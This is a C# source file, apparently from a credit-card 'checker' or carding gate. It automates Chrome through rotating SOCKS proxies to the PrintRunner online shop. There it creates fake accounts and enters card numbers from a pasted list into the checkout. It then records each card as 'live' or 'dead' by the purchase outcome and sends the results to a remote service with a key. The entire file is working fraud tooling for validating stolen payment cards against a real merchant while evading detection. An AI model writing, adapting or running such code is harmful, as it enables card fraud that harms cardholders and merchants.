using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Print
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {


            Socks socks = new Socks();
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run==true)
            {

                
                var prox = socks.proxy();

                if (prox.Trim() == "0" || prox.Trim() == "")
                {
                    MessageBox.Show("No hay socks disponibles");
                    return;
                }

                var ip = prox.Split(':');
                var ipUp = ip[1].ToString().Replace("//", "");


                //var verifiProxy = check.ping(Variables.key, prox);
                //if (verifiProxy == false)
                //{
                //    socks.proxyUp(ipUp);
                //    load();
                //}


                Form1.circularProgressBar1.Value = 5;
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                try
                {
                    driver.Url = "https://www.printrunner.com/standard-business-cards.html";
                }
                catch (Exception)
                {
                    socks.proxyUp(ipUp);
                    restart();
                }
                
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";

                if (IsElementPresent(By.XPath("//*[@id='main-message']/h1/span")))
                {
                    socks.proxyUp(ipUp);
                    restart();
                }

                if (IsElementPresent(By.XPath("/html/body")))
                {
                    if (driver.FindElement(By.XPath("/html/body")).Text.Trim() == "Backend not available")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/div/div[1]/h1")))
                {
                    if (driver.FindElement(By.XPath("/html/body/div/div[1]/h1")).Text.Trim() == "Custom Message")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/h2")))
                {
                    if (driver.FindElement(By.XPath("/html/body/h2")).Text.Trim() == "502 Bad Gateway")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("//*[@id='titles']/h1")))
                {
                    if (driver.FindElement(By.XPath("//*[@id='titles']/h1")).Text.Trim() == "ERROR")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                //*[@id="product-list-wrapper"]/ul/li[1]/div/div[1]/a

                //*[@id="product-list-wrapper"]/ul/li[18]/div/div[1]/a

                //var producto = "//*[@id='product-list-wrapper']/ul/li[" + RandomNumber(1, 18) + "]/div/div[1]/a";

                if (tiempoElemento(By.XPath("//*[@id='calculator']/div[2]/div[1]/div/div/calculator-attribute/div/div[2]/div/i")))
                {
                    Form1.circularProgressBar1.Value = 10;
                    driver.FindElement(By.XPath("//*[@id='calculator']/div[2]/div[1]/div/div/calculator-attribute/div/div[2]/div/i")).Click();
                    Thread.Sleep(300);
                    if (tiempoElemento(By.XPath("//*[@id='calculator']/div[2]/div[1]/div/div/calculator-attribute/div/div[2]/div[2]/div/ul/li[1]")))
                    {
                        driver.FindElement(By.XPath("//*[@id='calculator']/div[2]/div[1]/div/div/calculator-attribute/div/div[2]/div[2]/div/ul/li[1]")).Click();
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='upload_btn']/span/span")).Click();
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.XPath("/html/body/app/div/upload-page/div[1]/div[2]/div[2]/div[2]/div/div/a")))
                        {
                            driver.FindElement(By.XPath("/html/body/app/div/upload-page/div[1]/div[2]/div[2]/div[2]/div/div/a")).Click();
                            Thread.Sleep(1000);
                            if (tiempoElemento(By.XPath("/html/body/app/div/cart-page/div/div[2]/div/div/div[2]/div/div[1]/div[2]/button/span")))
                            {
                                driver.FindElement(By.XPath("/html/body/app/div/cart-page/div/div[2]/div/div/div[2]/div/div[1]/div[2]/button/span")).Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/login-handler/div/div[2]/div/a")))
                                {
                                    driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/login-handler/div/div[2]/div/a")).Click();
                                    Thread.Sleep(1000);
                                    if (tiempoElemento(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[1]/input")))
                                    {
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[1]/input")).SendKeys("JOSE");
                                        Thread.Sleep(100);
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[2]/input")).SendKeys("REYES");
                                        Thread.Sleep(100);
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[3]/input")).SendKeys(correo);
                                        Thread.Sleep(100);
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[4]/input")).SendKeys("213548" + RandomNumber(1000, 9999).ToString());
                                        Thread.Sleep(100);
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[5]/input")).SendKeys(clave);
                                        Thread.Sleep(100);
                                        driver.FindElement(By.XPath("/html/body/modal-container/div/div/login-register-modal/div/div[2]/login-register-host/register-handler/div/div[1]/form/div[6]/div/button/span")).Click();
                                        Thread.Sleep(1000);
                                        if (tiempoElemento(By.XPath("//*[@id='company_or_name']")))
                                        {

                                            driver.FindElement(By.XPath("/html/body/app/div/shipping/div[1]/div[2]/div/div[1]/div[1]/shipping-delivery-options/div/div/label[2]/span[2]")).Click();
                                            Thread.Sleep(2000);

                                            driver.FindElement(By.XPath("//*[@id='company_or_name']")).SendKeys("MY" + RandomNumber(1, 100).ToString());
                                            Thread.Sleep(100);
                                            //driver.FindElement(By.XPath("//*[@id='address1']")).SendKeys("SETREET " + RandomNumber(1, 100).ToString());
                                            //Thread.Sleep(100);
                                            //driver.FindElement(By.XPath("//*[@id='postal_code']")).SendKeys("10001");
                                            //Thread.Sleep(100);
                                            //driver.FindElement(By.XPath("//*[@id='city_or_town']")).SendKeys("NEW YORK");
                                            //Thread.Sleep(100);
                                            driver.FindElement(By.XPath("//*[@id='phone']")).SendKeys("213547" + RandomNumber(1000, 9999).ToString());
                                            Thread.Sleep(100);
                                            driver.FindElement(By.XPath("//*[@id='phone_ext']")).SendKeys("213");
                                            Thread.Sleep(100);
                                            //var estado = new SelectElement(driver.FindElement(By.Id("state_or_province")));
                                            //estado.SelectByValue("NY");
                                            Thread.Sleep(2000);
                                            driver.FindElement(By.XPath("/html/body/app/div/shipping/div[1]/div[2]/div/div[2]/div/div[2]/div[2]/button/span")).Click();
                                            
                                            Thread.Sleep(1000);

                                            //if (tiempoElemento(By.XPath("/html/body/app/div/shipping/div[2]/div/div/div[2]/address-suggestion/div/div[2]/div[3]/button[2]")))
                                            //{
                                            //    driver.FindElement(By.XPath("/html/body/app/div/shipping/div[2]/div/div/div[2]/address-suggestion/div/div[2]/div[3]/button[2]")).Click();
                                            //    Thread.Sleep(1000);
                                                if (tiempoElemento(By.XPath("//*[@id='payment_iframe']")))
                                                {
                                                    pago();
                                                }
                                                else
                                                {
                                                    restart();
                                                }
                                            //}
                                            //else
                                            //{
                                            //    restart();
                                            //}
                                                Thread.Sleep(1000);

                                        }
                                        else
                                        {
                                            restart();
                                        }

                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    restart();
                }


            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(3000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run==true)
                {
                    if (pagos < 5)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];



                     
                        if (IsElementPresent(By.XPath("//*[@id='payment_iframe']")))
                        {
                            driver.SwitchTo().Frame("payment_iframe");
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("ccNumber")).SendKeys(ccLine[0]);
                            Thread.Sleep(300);
                            var mes = new SelectElement(driver.FindElement(By.Id("expMonth")));
                            mes.SelectByValue((ccLine[1]).ToString());
                            Thread.Sleep(500);
                            var anio = new SelectElement(driver.FindElement(By.Id("expYear")));
                            anio.SelectByValue(ccLine[2]);
                            Thread.Sleep(500);
                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.Id("CVV2")).SendKeys("000");
                            }

                            if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.Id("CVV2")).SendKeys("0000");
                            }

                            Thread.Sleep(2000);
                            if (pagos == 0)
                            {
                                driver.SwitchTo().ParentFrame();

                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[2]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[1]/input")).SendKeys("street " + RandomNumber(20, 999));
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[2]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[3]/input")).SendKeys("NEW YORK");
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[2]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[4]/input")).SendKeys("10001");
                                Thread.Sleep(200);
                                Thread.Sleep(200);
                                var state = new SelectElement(driver.FindElement(By.XPath("//*[@id='state']")));
                                state.SelectByValue("NY");
                                Thread.Sleep(100);
                                driver.SwitchTo().Frame("payment_iframe");
                                driver.FindElement(By.XPath("//*[@id='completeButtonUL']/li/input")).Click();
                                Thread.Sleep(2000);
                                driver.SwitchTo().ParentFrame();
                            }
                            else
                            {
                                driver.SwitchTo().ParentFrame();

                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[3]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[1]/input")).SendKeys("street " + RandomNumber(20, 999));
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[3]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[3]/input")).SendKeys("NEW YORK");
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[3]/app-new-payment-profile/div[1]/div/label/span[2]/div[2]/div/app-cpt-billing-form/div/form/ul/li[4]/input")).SendKeys("10001");
                                Thread.Sleep(200);
                                Thread.Sleep(200);
                                var state = new SelectElement(driver.FindElement(By.XPath("//*[@id='state']")));
                                state.SelectByValue("NY");
                                Thread.Sleep(100);
                                driver.SwitchTo().Frame("payment_iframe");
                                driver.FindElement(By.XPath("//*[@id='completeButtonUL']/li/input")).Click();
                                Thread.Sleep(2000);
                                driver.SwitchTo().ParentFrame();
                            }

                            Thread.Sleep(1000);


                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
               
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[1]/div[2]/label")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[1]/div[2]/label")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/app/div/payment/div/div[2]/div/div[1]/div[1]/div[2]/label")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/app/div/confirmation/div/div/div/div[1]/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/app/div/confirmation/div/div/div/div[1]/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/app/div/confirmation/div/div/div/div[1]/div/h1")).Text.Trim() == "Thank You")
                            {
                                estado = "live";
                            }
                        }
                    }

              

                 
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

